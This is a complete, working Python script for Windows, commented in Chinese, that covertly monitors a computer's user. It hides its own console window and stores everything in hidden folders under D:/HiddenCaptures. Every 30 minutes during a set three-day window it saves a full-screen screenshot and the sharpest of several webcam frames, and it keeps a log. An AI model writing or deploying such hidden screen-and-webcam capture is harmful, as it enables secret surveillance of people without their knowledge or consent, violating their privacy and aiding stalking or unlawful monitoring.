import os
import sys
import time
import ctypes
import datetime
import logging
import threading
from pathlib import Path

import cv2
import numpy as np
from PIL import ImageGrab

# -------------------- 默认配置参数 --------------------
BASE_DIR = Path("D:/HiddenCaptures")          # 隐藏根目录
CONFIG_FILE = BASE_DIR / "config.txt"         # 配置文件路径
CAM_SUBDIR = "Camera"                         # 摄像头子目录
SCR_SUBDIR = "Screenshot"                     # 截屏子目录
LOG_FILE = "capture.log"                      # 日志文件（置于根目录）

# 可运行日期范围
VALID_START = datetime.date(2026, 5, 25)
VALID_END = datetime.date(2026, 5, 27)

# 默认配置值（会被 config.txt 覆盖）
DEFAULT_CONFIG = {
    "camera_index": "0",
    "warmup_frames": "30",
    "quality_samples": "5",
    "retry_delay_seconds": "300",
    "max_retries": "3",
    "interval_minutes": "30",
}

# 全局配置字典，只在主入口初始化一次
config = {}

# -------------------- 配置管理 --------------------
def load_or_create_config():
    """读取配置文件，如果不存在则用默认值创建。正确更新全局 config。"""
    global config

    # 确保基础目录存在
    BASE_DIR.mkdir(parents=True, exist_ok=True)

    # 先加载默认值
    config.clear()
    config.update(DEFAULT_CONFIG)

    if CONFIG_FILE.exists():
        # 读取用户配置，覆盖默认值
        with open(CONFIG_FILE, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                if "=" in line:
                    key, value = line.split("=", 1)
                    key = key.strip()
                    value = value.strip()
                    if key in DEFAULT_CONFIG:
                        config[key] = value
        logging.info("已加载配置文件")
    else:
        # 创建默认配置文件
        with open(CONFIG_FILE, "w", encoding="utf-8") as f:
            f.write("# 摄像头与截图自动保存配置\n")
            f.write("# 摄像头索引：0 通常为内置摄像头，1 为外接\n")
            f.write(f"camera_index={config['camera_index']}\n\n")
            f.write("# 预热丢弃帧数：等待摄像头对焦稳定\n")
            f.write(f"warmup_frames={config['warmup_frames']}\n\n")
            f.write("# 清晰度采样帧数：拍摄多帧，自动选择最清晰的保存\n")
            f.write(f"quality_samples={config['quality_samples']}\n\n")
            f.write("# 失败重试等待时间（秒）\n")
            f.write(f"retry_delay_seconds={config['retry_delay_seconds']}\n\n")
            f.write("# 最大重试次数\n")
            f.write(f"max_retries={config['max_retries']}\n\n")
            f.write("# 拍摄间隔（分钟）\n")
            f.write(f"interval_minutes={config['interval_minutes']}\n")
        logging.info("已创建默认配置文件 config.txt")

    # 验证数值有效性
    for k in list(config.keys()):
        if k in DEFAULT_CONFIG:
            try:
                int(config[k])
            except ValueError:
                logging.warning(f"配置项 {k} 值无效 ({config[k]})，使用默认值 {DEFAULT_CONFIG[k]}")
                config[k] = DEFAULT_CONFIG[k]

    return config

def get_config_int(key):
    """安全获取整数配置值"""
    return int(config.get(key, DEFAULT_CONFIG[key]))

# -------------------- 摄像头诊断 --------------------
def list_available_cameras():
    """扫描 0~9 索引，返回可用摄像头列表，并在日志中记录。"""
    available = []
    logging.info("正在扫描可用摄像头...")
    for idx in range(10):
        cap = cv2.VideoCapture(idx, cv2.CAP_ANY)
        if cap.isOpened():
            available.append(idx)
            # 尝试获取摄像头名称（可能为空）
            backend_name = "Unknown"
            logging.info(f"  发现摄像头索引 {idx} 可用")
            cap.release()
        else:
            cap.release()
    if not available:
        logging.warning("未检测到任何可用摄像头！")
    return available

# -------------------- 工具函数 --------------------
def hide_console():
    """隐藏控制台窗口（仅Windows有效）"""
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
    except Exception:
        pass

def ensure_dir(path: Path, hidden: bool = False):
    """创建目录，可选设置隐藏属性"""
    path.mkdir(parents=True, exist_ok=True)
    if hidden and os.name == 'nt':
        try:
            ctypes.windll.kernel32.SetFileAttributesW(str(path), 0x02)
        except Exception:
            pass

def get_timestamp():
    """返回用于文件名的精确时间戳"""
    return datetime.datetime.now().strftime("%Y%m%d_%H%M%S_%f")

def setup_logging(log_path: Path):
    """配置文件日志，仅在控制台可用时输出到控制台"""
    log_path.parent.mkdir(parents=True, exist_ok=True)
    logger = logging.getLogger()
    logger.setLevel(logging.INFO)

    file_handler = logging.FileHandler(str(log_path), encoding='utf-8')
    file_handler.setLevel(logging.INFO)
    file_formatter = logging.Formatter("%(asctime)s - %(levelname)s - %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
    file_handler.setFormatter(file_formatter)
    logger.addHandler(file_handler)

    # 控制台处理器：仅在 stdout 可用时添加
    if sys.stdout is not None:
        console_handler = logging.StreamHandler()
        console_handler.setLevel(logging.INFO)
        console_handler.setFormatter(file_formatter)
        logger.addHandler(console_handler)

# -------------------- 清晰度评估函数 --------------------
def calculate_sharpness(frame):
    """使用拉普拉斯方差评估图像清晰度，值越大越清晰"""
    if frame is None:
        return 0.0
    gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
    return cv2.Laplacian(gray, cv2.CV_64F).var()

# -------------------- 核心捕获逻辑 --------------------
def capture_camera(save_path: Path) -> bool:
    """打开摄像头，预热，采集多帧并自动选择最清晰的保存。"""
    camera_index = get_config_int("camera_index")
    warmup = get_config_int("warmup_frames")
    samples = get_config_int("quality_samples")

    cap = None
    try:
        # 使用自动后端选择，避免 DSHOW 的潜在不稳定性
        cap = cv2.VideoCapture(camera_index, cv2.CAP_ANY)
        if not cap.isOpened():
            logging.error(f"无法打开摄像头 (索引 {camera_index})")
            return False

        # 尝试设置高分辨率
        cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1920)
        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 1080)
        cap.set(cv2.CAP_PROP_FOURCC, cv2.VideoWriter_fourcc(*'MJPG'))

        # 丢弃预热帧
        for _ in range(warmup):
            ret, _ = cap.read()
            if not ret:
                logging.warning("预热帧读取失败，可能摄像头异常")
                break
            time.sleep(0.05)

        # 采集多帧并选最清晰
        best_frame = None
        best_sharpness = -1.0
        for i in range(samples):
            ret, frame = cap.read()
            if not ret or frame is None:
                logging.warning(f"清晰度采样帧 {i+1} 读取失败")
                continue
            sharp = calculate_sharpness(frame)
            if sharp > best_sharpness:
                best_sharpness = sharp
                best_frame = frame.copy()

        if best_frame is None:
            logging.error("未能采集到任何有效帧")
            return False

        save_path.parent.mkdir(parents=True, exist_ok=True)
        cv2.imwrite(str(save_path), best_frame, [cv2.IMWRITE_PNG_COMPRESSION, 3])
        logging.info(f"摄像头照片已保存: {save_path} (清晰度: {best_sharpness:.2f})")
        return True

    except Exception as e:
        logging.error(f"摄像头异常: {e}")
        return False
    finally:
        if cap is not None:
            cap.release()

def capture_screen(save_path: Path) -> bool:
    """截取整个屏幕并保存。锁屏或失败时静默忽略。"""
    try:
        img = ImageGrab.grab(all_screens=True)
        if img is None:
            logging.warning("截屏返回空图像（可能锁屏或远程桌面）")
            return False

        save_path.parent.mkdir(parents=True, exist_ok=True)
        img.save(str(save_path), "PNG")
        logging.info(f"屏幕截图已保存: {save_path}")
        return True

    except OSError as e:
        logging.warning(f"截屏失败（可能锁屏或会话不可用）: {e}")
        return False
    except Exception as e:
        logging.error(f"截屏异常: {e}")
        return False

def execute_task_with_retry():
    """
    执行一次拍摄任务：先截屏，后拍摄摄像头（中间加延时），
    摄像头失败可重试，截屏仅尝试一次。
    """
    max_retries = get_config_int("max_retries")
    retry_delay = get_config_int("retry_delay_seconds")
    timestamp = get_timestamp()
    cam_dir = BASE_DIR / CAM_SUBDIR
    scr_dir = BASE_DIR / SCR_SUBDIR

    # 1. 先进行屏幕截图（PIL），不与 OpenCV 并发
    scr_path = scr_dir / f"{timestamp}_scr.png"
    capture_screen(scr_path)

    # 2. 稍作延时，避免资源竞争
    time.sleep(1.0)

    # 3. 再进行摄像头捕获（可重试）
    success_cam = False
    for attempt in range(1, max_retries + 1):
        cam_path = cam_dir / f"{timestamp}_cam.png"
        if capture_camera(cam_path):
            success_cam = True
            break
        else:
            logging.warning(f"摄像头拍摄失败，第{attempt}次尝试")
            if attempt < max_retries:
                logging.info(f"等待 {retry_delay} 秒后重试...")
                time.sleep(retry_delay)
                timestamp = get_timestamp()
    if not success_cam:
        logging.error("摄像头拍摄最终失败，放弃本次摄像头任务")

# -------------------- 正常模式（后台定时） --------------------
def normal_mode():
    today = datetime.date.today()
    if not (VALID_START <= today <= VALID_END):
        logging.info(f"当前日期 {today} 不在允许范围内 ({VALID_START} ~ {VALID_END})，程序退出。")
        sys.exit(0)

    interval = get_config_int("interval_minutes") * 60
    logging.info(f"进入正常监控模式，每 {get_config_int('interval_minutes')} 分钟执行一次拍摄...")
    while True:
        try:
            execute_task_with_retry()
        except Exception as e:
            logging.error(f"任务执行出现未捕获异常: {e}")
        time.sleep(interval)

# -------------------- 测试模式 --------------------
def test_mode():
    import tkinter as tk
    from tkinter import messagebox

    ensure_dir(BASE_DIR, hidden=True)
    ensure_dir(BASE_DIR / CAM_SUBDIR)
    ensure_dir(BASE_DIR / SCR_SUBDIR)

    def run_task():
        btn.config(state=tk.DISABLED)
        status_var.set("正在拍摄，请稍候...")
        def worker():
            try:
                execute_task_with_retry()
                root.after(0, lambda: status_var.set("任务完成！可查看保存的图片。"))
            except Exception as e:
                root.after(0, lambda: messagebox.showerror("错误", f"发生异常:\n{e}"))
            finally:
                root.after(0, lambda: btn.config(state=tk.NORMAL))
        threading.Thread(target=worker, daemon=True).start()

    root = tk.Tk()
    root.title("测试模式 - 屏幕与摄像头捕获")
    root.geometry("340x200")
    root.resizable(False, False)

    tk.Label(root, text="测试控制面板", font=("微软雅黑", 12)).pack(pady=10)
    status_var = tk.StringVar(value="点击按钮立即执行一次拍摄")
    tk.Label(root, textvariable=status_var, wraplength=300).pack(pady=5)
    btn = tk.Button(root, text="立即拍摄", command=run_task, width=15, height=2)
    btn.pack(pady=10)

    logging.info("测试窗口已启动")
    root.mainloop()

# -------------------- 主入口 --------------------
if __name__ == "__main__":
    hide_console()
    BASE_DIR.mkdir(parents=True, exist_ok=True)

    # 加载或创建配置
    config = load_or_create_config()

    # 设置根目录及子目录隐藏
    if os.name == 'nt':
        try:
            ctypes.windll.kernel32.SetFileAttributesW(str(BASE_DIR), 0x02)
        except:
            pass

    ensure_dir(BASE_DIR / CAM_SUBDIR)
    ensure_dir(BASE_DIR / SCR_SUBDIR)
    for sub in [CAM_SUBDIR, SCR_SUBDIR]:
        try:
            ctypes.windll.kernel32.SetFileAttributesW(str(BASE_DIR / sub), 0x02)
        except:
            pass

    setup_logging(BASE_DIR / LOG_FILE)

    # 摄像头诊断：列出所有可用设备，并检查配置索引是否有效
    available_cams = list_available_cameras()
    configured_cam = get_config_int("camera_index")
    if configured_cam not in available_cams:
        logging.warning(f"配置的摄像头索引 {configured_cam} 不可用！请修改 config.txt 中的 camera_index")
        if available_cams:
            logging.info(f"可用摄像头索引: {available_cams}")
        else:
            logging.warning("没有可用的摄像头，摄像头功能将无法工作。")

    if "test" in sys.argv:
        logging.info("以测试模式启动")
        test_mode()
    else:
        logging.info("以正常模式启动")
        normal_mode()
